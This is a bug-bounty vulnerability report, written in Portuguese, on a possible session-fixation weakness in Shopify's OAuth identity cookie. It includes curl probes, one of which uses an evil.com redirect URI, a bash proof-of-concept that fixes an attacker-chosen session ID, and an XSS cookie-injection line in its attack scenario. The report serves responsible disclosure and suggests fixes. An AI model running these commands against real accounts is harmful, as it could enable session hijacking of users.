# Finding S1 — Pre-Auth Session Cookie: Potential Session Fixation on accounts.shopify.com

**Título:** Pre-authentication session cookie (`_identity_session`) aceita valores arbitrários e não força rotação — potencial session fixation no OIDC identity provider  
**Severidade:** HIGH (se confirmado pós-login) | **Info:** MEDIUM se rotação existe mas não foi verificada  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` → **6.8 MEDIUM** (pre-fix) | 8.1 HIGH (se confirmado)  
**CWE:** CWE-384 (Session Fixation)  
**Status:** Parcialmente confirmado — rotação pós-login pendente de verificação com conta real  
**Target:** `accounts.shopify.com/oauth/authorize`  
**Scope:** `shopify.com` (in-scope HackerOne)  

---

## Resumo Técnico

O endpoint `accounts.shopify.com/oauth/authorize` (identity provider OIDC da Shopify) define um cookie de sessão `_identity_session` **antes da autenticação** do usuário. 

Foram identificados dois comportamentos anômalos:

1. **O servidor aceita e ecoa de volta qualquer session ID fornecido pelo cliente** — se o cliente envia `Cookie: _identity_session=ATACANTE_VALOR`, o servidor responde com `Set-Cookie: _identity_session=ATACANTE_VALOR` sem gerar um novo ID seguro.

2. **O cookie `_identity_session` é definido com `SameSite=None`** em TODAS as requisições ao endpoint, independente de `client_id`, `redirect_uri` ou `scope` — tornando-o enviável em contextos cross-origin.

Se o session ID **não rotacionar após o login bem-sucedido**, um atacante pode fixar a sessão e esperar a vítima autenticar.

---

## Evidências

### Evidência 1 — Servidor ecoa session ID arbitrário

```bash
# Atacante envia session ID controlado
curl -sk -D - \
  "https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=test&redirect_uri=https://example.com&scope=openid&state=xyz" \
  -H "Cookie: _identity_session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1" \
  2>/dev/null | grep "_identity_session"
```

**Resposta observada:**
```
set-cookie: _identity_session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1; path=/; ...
```

O servidor retornou exatamente o mesmo session ID enviado pelo cliente.

### Evidência 2 — SameSite=None universal

```bash
# Testado com múltiplos redirect_uris e scopes
for redir in "https://example.com" "https://evil.com" "https://admin.shopify.com/"; do
  curl -sk -D - \
    "https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=test&redirect_uri=${redir}&scope=openid&state=xyz" \
    2>/dev/null | grep "_identity_session;"
done
```

**Resultado:**
```
set-cookie: _identity_session=...; path=/; expires=...; secure; httponly; samesite=none
set-cookie: _identity_session=...; path=/; expires=...; secure; httponly; samesite=none
set-cookie: _identity_session=...; path=/; expires=...; secure; httponly; samesite=none
```

`SameSite=None` confirmado em TODOS os casos.

### Evidência 3 — Dual cookie pattern

```
Cookie 1: _identity_session=<hex32>; SameSite=None; Secure; HttpOnly
Cookie 2: __Host-_identity_session_same_site=<hex32>; SameSite=Lax; Secure; HttpOnly
```

- Cookie 1 (`SameSite=None`) → enviado em requests cross-origin
- Cookie 2 (`__Host-` + `SameSite=Lax`) → mais seguro, para requests same-site

A existência dual sugere que o servidor pode verificar ambos. A questão crítica: **o servidor aceita autenticação apenas com o Cookie 1 (SameSite=None) sem o Cookie 2?**

---

## PoC de Session Fixation (para verificação pelo usuário)

**Pré-requisito:** Conta Shopify real (dev store em partners.shopify.com)

```bash
#!/bin/bash
# STEP 1: Attacke obtém session ID controlado
echo "=== STEP 1: Obter session ID controlado ==="
FIXED_SESSION="deadbeefdeadbeefdeadbeefdeadbeef"

# Fazer request com session ID fixo
curl -sk -D /tmp/step1_headers.txt \
  "https://accounts.shopify.com/oauth/authorize?response_type=code&client_id=YOUR_APP_CLIENT_ID&redirect_uri=https://YOUR_APP/callback&scope=openid&state=attack_state" \
  -H "Cookie: _identity_session=$FIXED_SESSION; __Host-_identity_session_same_site=$FIXED_SESSION" \
  -o /tmp/step1_body.html

echo "Server echoed session ID:"
grep "_identity_session" /tmp/step1_headers.txt | head -2

# STEP 2: Vítima navega para o link do OAuth com o session fixado
# (simulado aqui como a mesma conta num browser diferente)
echo ""
echo "=== STEP 2: Vítima autentica com o session ID fixado ==="
echo "Abrir em browser incógnito: "
echo "  1. Setar cookie: _identity_session=$FIXED_SESSION"
echo "  2. Navegar para: https://accounts.shopify.com/oauth/authorize?client_id=..."
echo "  3. Fazer login com suas credenciais"

# STEP 3: Verificar se o session ID rotacionou
echo ""
echo "=== STEP 3: Verificar rotação ==="
echo "Após login, checar com Burp Suite/devtools:"
echo "  ANTES do login:  _identity_session = $FIXED_SESSION"
echo "  APÓS o login:    _identity_session = ???"
echo ""
echo "SE o valor mudou → não vulnerável (rotação implementada)"
echo "SE o valor é IGUAL → SESSION FIXATION CONFIRMADO"
```

---

## Cenário de Ataque (se confirmado)

```
Pré-condições:
  - Atacante precisa de um mecanismo para injetar o cookie no browser da vítima
  - Opções: XSS em *.shopify.com, subdomain takeover + cookie injection

Ataque:
  1. Atacante visita /oauth/authorize → obtém session ID próprio (SESSION_A)
  2. Atacante usa XSS em qualquer *.shopify.com para injetar:
     document.cookie = "_identity_session=SESSION_A; domain=accounts.shopify.com; ..."
     [Obs: limitação — sem Domain em _identity_session, só accounts.shopify.com pode ser alvo direto]
  3. Vítima, com SESSION_A fixado, faz login na Shopify
  4. SESSION_A agora está autenticado como vítima
  5. Atacante usa SESSION_A para acessar a conta da vítima
```

**Amplificador:** O `_merchant_essential` tem `Domain=.shopify.com` — se um atacante puder manipular ESTE cookie via XSS em qualquer subdomínio Shopify, combinado com a session fixation...

---

## O que Shopify Deve Verificar

1. **Confirmar:** O session ID em `_identity_session` é ROTACIONADO após autenticação bem-sucedida?  
   - Se sim → vulnerabilidade mitigada (mas SameSite=None ainda é preocupante)
   - Se não → session fixation crítica

2. **Confirmar:** O servidor usa AMBOS os cookies (`_identity_session` + `__Host-*`) para validar sessões, ou apenas um deles?

3. **Considerar:** Por que `_identity_session` tem `SameSite=None` globalmente? Apenas apps embedded (iframes) precisam disso — para o fluxo padrão, `SameSite=Lax` seria mais seguro.

---

## Remediação Sugerida

1. **Imediata:** Garantir que `_identity_session` seja REGENERADO após login bem-sucedido (rotação de sessão)
2. **Curto prazo:** Mudar `_identity_session` para `SameSite=Lax` para o fluxo padrão de browsers; manter `None` apenas para fluxos embedded explicitamente identificados
3. **Verificação:** Confirmar que o servidor rejeita sessões não-inicializadas pelo servidor (i.e., não aceita session IDs arbitrários que não existem no store)

---

## Notas de Teste

- Todos os testes foram GET requests passivos ao endpoint público `/oauth/authorize`
- Nenhuma tentativa de login foi realizada
- Nenhuma conta de terceiros foi afetada
- Request rate: < 1 req/segundo
